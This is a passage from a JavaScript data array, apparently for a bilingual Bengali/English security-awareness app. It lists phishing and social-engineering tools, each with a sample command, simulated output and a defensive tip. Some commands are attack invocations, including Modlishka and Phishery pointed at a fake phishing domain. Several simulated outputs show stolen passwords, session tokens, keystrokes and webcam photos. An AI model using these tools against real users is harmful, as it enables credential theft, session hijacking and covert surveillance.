    bestPracticeTipBn: 'FIDO2 / WebAuthn হার্ডওয়্যার সিকিউরিটি কী (যেমন Yubikey) ব্যবহার করুন যা ফিশিং প্রতিরোধ করে।'
  },
  {
    id: 'gophish',
    name: 'Gophish',
    category: 'phishing',
    categoryTitleBn: 'অ্যাডভান্সড ফিশিং',
    categoryTitleEn: 'Advanced Phishing',
    testingTypeEn: 'Enterprise Phishing Simulator',
    testingTypeBn: 'এন্টারপ্রাইজ ফিশিং সিমুলেটর',
    descBn: 'প্রতিষ্ঠানের কর্মীদের সচেতনতা বাড়াতে প্রফেশনাল ফিশিং ইমেইল ক্যাম্পেইন পরিচালনা করে।',
    descEn: 'Open-source phishing toolkit designed for businesses to test employee security awareness and training.',
    sampleCommand: 'gophish --config=config.json',
    simulatedOutput: [
      'Gophish started on https://127.0.0.1:3333',
      'Campaign "Q4 IT Security Awareness" launched to 250 employees.',
      'Emails Sent: 250 | Opened: 180 | Clicked Link: 45 | Submitted Passwords: 12'
    ],
    bestPracticeTipEn: 'Regular interactive simulations train employees to identify deceptive sender domains and header spoofs.',
    bestPracticeTipBn: 'নিয়মিত ফিশিং ড্রিল চালিয়ে কর্মীদের সচেতনতা বৃদ্ধি করুন।'
  },
  {
    id: 'modlishka',
    name: 'Modlishka',
    category: 'phishing',
    categoryTitleBn: 'অ্যাডভান্সড ফিশিং',
    categoryTitleEn: 'Advanced Phishing',
    testingTypeEn: 'Reverse Proxy MITM Phishing',
    testingTypeBn: 'রিভার্স প্রক্সি ম্যান-ইন-দ্য-মিডল ফিশিং',
    descBn: 'ভিকটিম ও মূল ওয়েবসাইটের মাঝে অবস্থান করে লাইভ টু-ফ্যাক্টর অথেনটিকেশন বাইপাস করে।',
    descEn: 'Reverse Proxy that transparently sits between target and client, relaying all traffic while harvesting credentials and 2FA tokens.',
    sampleCommand: 'modlishka -target target.com -phishingDomain auth.fake.com',
    simulatedOutput: [
      'Modlishka listening on 0.0.0.0:443',
      'Forwarding traffic to: https://target.com',
      '[Captured Session] Token: JSESSIONID=B29A... (Session hijacked)'
    ],
    bestPracticeTipEn: 'Use domain-bound passkeys which verify the browser URL bar before exchanging cryptographic keys.',
    bestPracticeTipBn: 'ডোমেইন বাউন্ড পাস-কী ব্যবহার করুন যা ব্রাউজারের আসল ইউআরএল যাচাই ছাড়া কি শেয়ার করে না।'
  },
  {
    id: 'kingphisher',
    name: 'King Phisher',
    category: 'phishing',
    categoryTitleBn: 'অ্যাডভান্সড ফিশিং',
    categoryTitleEn: 'Advanced Phishing',
    testingTypeEn: 'Phishing Campaign Architecture',
    testingTypeBn: 'ফিশিং ক্যাম্পেইন আর্কিটেকচার',
    descBn: 'বাস্তবধর্মী স্পিয়ার-ফিশিং (Spear Phishing) অ্যাটাক তৈরি ও মনিটর করার ফ্রেমওয়ার্ক।',
    descEn: 'Tool for simulating realistic spear phishing attacks with campaign management and SMS/Email messaging capabilities.',
    sampleCommand: 'king-phisher-server -c server_config.json',
    simulatedOutput: [
      'Server started on 0.0.0.0:80',
      'Tracking server connected to PostgreSQL database.',
      'GeoIP tracking active: Tracking visitor IP locations and User-Agents.'
    ],
    bestPracticeTipEn: 'Enforce strict SPF, DKIM, and DMARC policies on mail servers to prevent domain spoofing.',
    bestPracticeTipBn: 'ইমেইল সার্ভারে SPF, DKIM ও DMARC পলিসি কার্যকর করে ভুয়া ইমেইল আসা বন্ধ করুন।'
  },

  // ৬. সোশ্যাল ইঞ্জিনিয়ারিং ও ফিশিং টুলস (SOCIAL ENGINEERING TOOLS)
  {
    id: 'phishery',
    name: 'Phishery',
    category: 'social',
    categoryTitleBn: 'সোশ্যাল ইঞ্জিনিয়ারিং',
    categoryTitleEn: 'Social Engineering',
    testingTypeEn: 'Word Doc Credential Harvesting',
    testingTypeBn: 'ওয়ার্ড ডকুমেন্ট ক্রেডেনশিয়াল হার্ভেস্টিং',
    descBn: 'MS Word ডকুমেন্টের ভিতরে গোপন টেমপ্লেট ইনজেক্ট করে ডোমেইন ক্রেডেনশিয়াল চুরি করে।',
    descEn: 'Injects URL into Word .docx documents to prompt users for Basic Authentication credentials upon document open.',
    sampleCommand: 'phishery -u https://auth.fake.com -i input.docx -o invoice.docx',
    simulatedOutput: [
      '[+] Successfully injected template URL into invoice.docx',
      'When user opens invoice.docx, Word will prompt for Domain Login.'
    ],
    bestPracticeTipEn: 'Configure Microsoft Office trust center to block external document template injection.',
    bestPracticeTipBn: 'এমএস অফিসের ট্রাস্ট সেন্টারে এক্সটার্নাল টেমপ্লেট লোডিং ব্লক করে রাখুন।'
  },
  {
    id: 'credsniper',
    name: 'CredSniper',
    category: 'social',
    categoryTitleBn: 'সোশ্যাল ইঞ্জিনিয়ারিং',
    categoryTitleEn: 'Social Engineering',
    testingTypeEn: 'Python Phishing Framework',
    testingTypeBn: 'পাইথন ফিশিং ফ্রেমওয়ার্ক',
    descBn: '2FA সমর্থনকারী ক্লোন করা লগইন পেজ তৈরি করে পাসওয়ার্ড সংগ্রহ করে।',
    descEn: 'Phishing framework written with Python micro-framework that supports capturing 2FA tokens via SMS or Authenticator.',
    sampleCommand: 'python3 credsniper.py --module gmail --twofactor',
    simulatedOutput: [
      'Starting CredSniper on port 443...',
      'Serving clone of Google Accounts Login with 2FA prompt enabled.'
    ],
    bestPracticeTipEn: 'Verify website SSL certificates and never accept security certificate mismatch warnings in browsers.',
    bestPracticeTipBn: 'ব্রাউজারে কোনো ইনভ্যালিড এসএসএল সার্টিফিকেট ওয়ার্নিং আসলে কখনোই পাসওয়ার্ড দেবেন না।'
  },
  {
    id: 'camphish',
    name: 'CamPhish',
    category: 'social',
    categoryTitleBn: 'সোশ্যাল ইঞ্জিনিয়ারিং',
    categoryTitleEn: 'Social Engineering',
    testingTypeEn: 'Webcam Access Phishing',
    testingTypeBn: 'ওয়েবক্যাম এক্সেস ফিশিং',
    descBn: 'ফেইক ওয়েব পেজের লিংক পাঠিয়ে ভিকটিমের অজান্তে ফ্রন্ট ক্যামেরার ছবি তোলে।',
    descEn: 'Technique that uses WebRTC and browser getUserMedia() permission prompts disguised as video players to snap webcam photos.',
    sampleCommand: 'bash camphish.sh',
    simulatedOutput: [
      '[+] Tunnel created with Cloudflared: https://live-stream-2026.trycloudflare.com',
      '[+] Target opened link! Prompting: "Allow camera to watch video?"',
      '[+] Permission granted! Cam photo saved to /cam_snaps/cam_01.png'
    ],
    bestPracticeTipEn: 'Never grant Camera or Microphone permissions to unfamiliar third-party websites.',
    bestPracticeTipBn: 'অপরিচিত কোনো ওয়েবসাইটকে কখনো ক্যামেরা বা মাইক্রোফোনের পারমিশন দেবেন না।'
  },
  {
    id: 'saycheese',
    name: 'SayCheese',
    category: 'social',
    categoryTitleBn: 'সোশ্যাল ইঞ্জিনিয়ারিং',
    categoryTitleEn: 'Social Engineering',
    testingTypeEn: 'Target Photo Capture Attack',
    testingTypeBn: 'টার্গেট ফটো ক্যাপচার অ্যাটাক',
    descBn: 'লিংকে ক্লিক করা মাত্রই ভিকটিমের ক্যামেরা অ্যাক্সেস করে ছবি সার্ভারে পাঠায়।',
    descEn: 'HTML5 webcam photo capturing tool generating fake landing pages (festivals, games) that trick users into sharing camera access.',
    sampleCommand: 'bash saycheese.sh',
    simulatedOutput: [
      '[+] Hosting festival greeting card template...',
      '[+] Target clicked link!',
      '[+] Image received from front camera! (Size: 320x240)'
    ],
    bestPracticeTipEn: 'Keep browser permissions set to "Block all sites from accessing your camera by default".',
    bestPracticeTipBn: 'ব্রাউজারের সেটিংসে ডিফল্টভাবে ক্যামেরা পারমিশন ব্লক করে রাখুন।'
  },
  {
    id: 'zphisher',
    name: 'Zphisher',
    category: 'social',
    categoryTitleBn: 'সোশ্যাল ইঞ্জিনিয়ারিং',
    categoryTitleEn: 'Social Engineering',
    testingTypeEn: 'Automated Multi-Page Phishing',
    testingTypeBn: 'অটোমেটেড মাল্টি-পেজ ফিশিং',
    descBn: 'Facebook, Google সহ ৩০+ পপুলার সোশ্যাল সাইটের ফেইক পেজ তৈরি করে পাসওয়ার্ড চুরি করে।',
    descEn: 'Automated phishing tool with 30+ pre-built fake social media templates including Facebook, Instagram, Google, and Netflix.',
    sampleCommand: 'bash zphisher.sh',
    simulatedOutput: [
      '[01] Facebook    [02] Instagram    [03] Google',
      '[Select]: 01 (Facebook Login Page Clone)',
      '[+] Tunnel URL: https://facebook-security-verify.loca.lt',
      '[+] Waiting for victim credentials...'
    ],
    bestPracticeTipEn: 'Always check the domain name in the browser address bar before typing passwords. Verify it matches facebook.com or google.com exactly.',
    bestPracticeTipBn: 'পাসওয়ার্ড দেওয়ার আগে ব্রাউজারের ইউআরএল বারে দেখুন আসল ডোমেইন (facebook.com) কিনা।'
  },
  {
    id: 'socialfish',
    name: 'SocialFish',
    category: 'social',
    categoryTitleBn: 'সোশ্যাল ইঞ্জিনিয়ারিং',
    categoryTitleEn: 'Social Engineering',
    testingTypeEn: 'Credential Harvesting with Ngrok',
    testingTypeBn: 'এনগ্রক দিয়ে ক্রেডেনশিয়াল হার্ভেস্টিং',
    descBn: 'সোশ্যাল মিডিয়া লগইন পেজের প্রতিলিপি বানিয়ে ব্যবহারকারীর পাসওয়ার্ড ধরে ফেলে।',
    descEn: 'Educational tool for cloning social networks and routing them over ngrok tunnels to demonstrate credential harvesting risks.',
    sampleCommand: 'python3 SocialFish.py root pass',
    simulatedOutput: [
      '[+] SocialFish web server started on port 5000',
      '[+] Ngrok tunnel active',
      '[VICTIM] Entered username: student@university.edu | pass: mySecret2026'
    ],
    bestPracticeTipEn: 'Use password managers (Bitwarden, 1Password) which automatically refuse to autofill on fake phishing domains.',
    bestPracticeTipBn: 'পাসওয়ার্ড ম্যানেজার ব্যবহার করুন যা ভুয়া ফিশিং সাইটে নিজে থেকে পাসওয়ার্ড টাইপ করে না।'
  },
  {
    id: 'hiddeneye',
    name: 'HiddenEye',
    category: 'social',
    categoryTitleBn: 'সোশ্যাল ইঞ্জিনিয়ারিং',
    categoryTitleEn: 'Social Engineering',
    testingTypeEn: 'Advanced Automated Phishing',
    testingTypeBn: 'অ্যাডভান্সড অটোমেটেড ফিশিং',
    descBn: 'কী-লোগার এবং লোকেশন ট্র্যাকার যুক্ত অল-ইন-ওয়ান ফিশিং পেজ তৈরি করে।',
    descEn: 'Modern phishing tool featuring live keylogger capture, IP location lookup, and automated multi-tunneling.',
    sampleCommand: 'python3 HiddenEye.py',
    simulatedOutput: [
      '[+] Keylogger injection enabled',
      '[+] IP Geolocation tracker attached',
      '[TARGET INFO] IP: 103.112.54.12 | City: Dhaka | OS: Windows 11',
      '[KEYLOG] Pressed keys: P-a-s-s-w-o-r-d-1-2-3'
    ],
    bestPracticeTipEn: 'Be vigilant against deceptive phishing links in social media messages and SMS.',
    bestPracticeTipBn: 'ইনবক্সে আসা কোনো অজানা শর্ট লিংকে কখনো ক্লিক করবেন না।'
  },
  {
    id: 'blackeye',
    name: 'BlackEye',
    category: 'social',
    categoryTitleBn: 'সোশ্যাল ইঞ্জিনিয়ারিং',
    categoryTitleEn: 'Social Engineering',
    testingTypeEn: 'Automated Phishing Tool',
    testingTypeBn: 'অটোমেটেড ফিশিং টুল',
    descBn: '৪০টিরও বেশি প্ল্যাটফর্মের হুবহু ফেইক লগইন প্যানেল তৈরি করে লিংক পাঠায়।',
    descEn: 'Simple bash script hosting 38+ phishing sites (PayPal, Steam, Twitter, Protonmail) over port forwarding.',
    sampleCommand: 'bash blackeye.sh',
    simulatedOutput: [
      '[+] Available Sites: 38 templates',
      '[+] Hosting PayPal fake payment verification...',
      '[+] Waiting for credentials...'
    ],
    bestPracticeTipEn: 'Never access sensitive accounts through emailed login links; navigate directly via official bookmarks.',
    bestPracticeTipBn: 'ইমেইলে আসা লিংকে না গিয়ে নিজে বুকমার্ক বা টাইপ করে অফিশিয়াল সাইটে ঢুকুন।'
  },
  {
    id: 'blackphish',
    name: 'BlackPhish',
    category: 'social',
    categoryTitleBn: 'সোশ্যাল ইঞ্জিনিয়ারিং',
    categoryTitleEn: 'Social Engineering',
    testingTypeEn: 'Lightweight Phishing Page Generator',
    testingTypeBn: 'লাইটওয়েট ফিশিং পেজ জেনারেটর',
    descBn: 'সহজ ইন্টারফেসে খুব দ্রুত যেকোনো ওয়েবসাইটের ফিশিং পেজ তৈরি করে।',
    descEn: 'Lightweight terminal tool generating HTML/CSS phishing portals with minimal resource footprint.',
    sampleCommand: 'python3 blackphish.py',
    simulatedOutput: [
      '[+] Template generated successfully',
      '[+] Web server started on port 8080'
    ],
    bestPracticeTipEn: 'Security awareness training helps users detect visual anomalies in cloned web pages.',
    bestPracticeTipBn: 'ফিশিং পেজের টাইপো বা ভুল বানান লক্ষ্য করে প্রতারণা ধরা যায়।'
  },
  {
    id: 'shellphish',
    name: 'ShellPhish',
    category: 'social',
    categoryTitleBn: 'সোশ্যাল ইঞ্জিনিয়ারিং',
    categoryTitleEn: 'Social Engineering',
    testingTypeEn: 'Social Media Phishing',
    testingTypeBn: 'সোশ্যাল মিডিয়া ফিশিং',
    descBn: 'কমান্ড লাইনের মাধ্যমে সামাজিক যোগাযোগের মাধ্যমের পাসওয়ার্ড চুরির লিংক তৈরি করে।',
    descEn: 'Bash scripting suite automating the deployment of phishing pages for Instagram, LinkedIn, and Snapchat.',
    sampleCommand: 'bash shellphish.sh',
    simulatedOutput: [
      '[+] Generating tunnel...',
      '[+] Send link to target: https://secure-login-portal.ngrok.io'
    ],
    bestPracticeTipEn: 'Always enable app-based 2FA (Google Authenticator) instead of relying solely on SMS passwords.',
    bestPracticeTipBn: 'এসএমএস কোডের বদলে গুগল অথেন্টিকেটর অ্যাপ দিয়ে টু-ফ্যাক্টর সুরক্ষা অন রাখুন।'
  },
  {
    id: 'phishx',
    name: 'PhishX',
    category: 'social',
    categoryTitleBn: 'সোশ্যাল ইঞ্জিনিয়ারিং',
    categoryTitleEn: 'Social Engineering',
    testingTypeEn: 'Multi-template Phishing Kit',
    testingTypeBn: 'মাল্টি-টেমপ্লেট ফিশিং কিট',
    descBn: 'বিভিন্ন সোশ্যাল নেটওয়ার্কের ফেক পেজ টেমপ্লেট ব্যবহার করে লগইন তথ্য চুরি করে।',
    descEn: 'Multi-template credential harvesting suite designed to test user susceptibility to visual impersonation.',
    sampleCommand: 'bash phishx.sh',
    simulatedOutput: [
      '[+] Template loaded: Online Banking Portal',
      '[+] Listening for HTTP POST submissions...'
    ],
    bestPracticeTipEn: 'Deploy corporate DNS filtering to automatically block known newly registered phishing domains.',
    bestPracticeTipBn: 'কর্পোরেট ডিএনএস ফিল্টারিং দিয়ে নতুন তৈরি হওয়া সন্দেহজনক ডোমেইন ব্লক করুন।'
  },
  {
    id: 'evilnovnc',
    name: 'EvilnoVNC',
    category: 'social',
    categoryTitleBn: 'সোশ্যাল ইঞ্জিনিয়ারিং',
    categoryTitleEn: 'Social Engineering',
    testingTypeEn: 'Browser-In-The-Middle / Remote Access',
    testingTypeBn: 'ব্রাউজার-ইন-দ্য-মিডল ও রিমোট অ্যাক্সেস',
    descBn: 'noVNC ব্যবহার করে ভিকটিমের সম্পূর্ণ ব্রাউজার সেশন নিজের নিয়ন্ত্রণে নিয়ে নেয়।',
    descEn: 'Browser-in-the-Middle (BitM) attack framework that displays a live remote Chromium session inside an iframe to capture full session state.',
    sampleCommand: 'docker run -p 8080:8080 evilnovnc',
    simulatedOutput: [
      '[+] noVNC WebSockets proxy listening on port 8080',
      '[+] Chromium instance streaming to victim browser',
      '[+] Victim logged in: Attacker has direct GUI control of active session!'
    ],
    bestPracticeTipEn: 'Train users to recognize strange iframe behaviors and avoid interacting with remote desktop streams mimicking local browsers.',
    bestPracticeTipBn: 'ব্রাউজারের ভেতরে অন্য কোনো সন্দেহজনক উইন্ডো বা রিমোট ডেস্কটপ ফ্রেম এড়িয়ে চলুন।'
  }
];
